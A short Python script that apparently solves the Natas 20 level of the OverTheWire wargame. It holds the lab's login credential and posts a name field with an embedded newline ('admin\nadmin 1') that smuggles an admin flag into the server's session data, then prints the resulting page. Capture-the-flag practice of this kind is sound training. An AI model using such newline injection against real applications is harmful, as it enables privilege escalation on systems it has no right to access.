import requests

with requests.Session() as session:
    url = "http://natas20.natas.labs.overthewire.org/"
    session.auth = ("natas20", "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF")

    pwn_data = {
        "name": "admin\nadmin 1",
    }

    session.post(
        url,
        data=pwn_data,
    )

    r = session.get(
        url,
    )

    print(r.content.decode())
